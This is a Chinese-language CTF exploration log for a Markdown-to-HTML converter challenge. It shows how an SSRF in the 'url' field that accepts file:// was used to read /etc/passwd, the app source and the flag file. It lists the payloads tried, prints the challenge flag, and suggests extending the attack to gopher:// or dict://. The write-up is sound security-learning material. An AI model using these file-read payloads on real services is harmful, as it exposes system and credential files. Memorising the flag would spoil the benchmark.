# xben-033-24 · 探索记录

对应题解：[`xben-033-24.md`](./xben-033-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`Werkzeug/3.0.6 Python/3.8.20`。
标题 `Markdown to HTML Converter`，表单 POST 到 `/convert`，两个字段：
`url`（抓取远端内容）与 `markdown_text`（本地文本）。

## 第一阶段：先确认转换是通的

```bash
curl -X POST --data-urlencode 'markdown_text=# Hi *x*' /convert
```

```html
<div class="result"><h1>Hi <em>x</em></h1></div>
```

转换正常，输出在 `.result` 里。

## 第二阶段：`markdown_text` 有没有模板注入

| 输入 | 输出 |
| --- | --- |
| `{{7*7}}` | `{{7*7}}`（原样） |

说明 markdown 只是被渲染成 HTML，没有模板求值 → 干扰项。

## 第三阶段：`url` 是 SSRF

| url | 结果 |
| --- | --- |
| `http://127.0.0.1/` | 返回本机首页 HTML（再被 markdown 渲染） |
| `http://localhost:80/` | 同上 |
| **`file:///etc/passwd`** | **直接返回 `/etc/passwd` 内容** |
| `file:///FLAG.txt`（不存在） | 空结果 |

`file://` 放行 → 任意文件读。

## 第四阶段：找 flag

| 路径 | 结果 |
| --- | --- |
| `/flag` | 空 |
| `/FLAG.txt` | 空 |
| **`/flag.txt`** | **`flag{258839eb-75d8-46ee-a8c9-1ce7b91963f9}`** |
| `/tmp/flag`、`/app/flag`、`/challenge/flag.txt`、`/root/flag`、`/home/flag` | 空 |

顺带读了 `/app/app.py`，能看到 `import urllib.request` 和路由定义，
确认是裸 `urlopen`（无协议白名单）。

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `markdown_text={{7*7}}` | 原样输出 | 渲染层没有模板求值，不是 SSTI |
| 只测 HTTP SSRF | 只能拿到本机页面 | 没有内网服务可打 |
| `file:///flag`、`file:///FLAG.txt`、`file:///tmp/flag` 等 | 空 | 文件名不对，实际是 `/flag.txt` |

## 这次真正的收获

1. **"帮我抓这个 URL" 就是 SSRF；第一步测 `file://`。** HTTP 只能打内网，
   `file://` 能直接把任意文件读出来，往往是本题最近的目标。
2. **转换/预览类功能是 SSRF 的固定高发点**：markdown 预览、图片/PDF 抓取、
   RSS 导入、URL 缩略图。判据是响应里出现目标内容。
3. **别被另一个输入带偏。** `markdown_text` 看着更像"渲染注入"，但测一次
   `{{7*7}}` 就排除；把精力放在 `url` 上。
4. **任意文件读之后先枚举常见 flag 名。** 本题 `/flag.txt` 命中，
   `/flag`、`/FLAG.txt`、`/tmp/flag` 全空——四个常见组合按顺序试，成本很低。
5. **能读源码时要读。** `file:///app/app.py` 直接给出了实现（`urllib.request`，
   无白名单），这决定了后续还能不能扩展成 `gopher://`/`dict://` 等更深的利用。
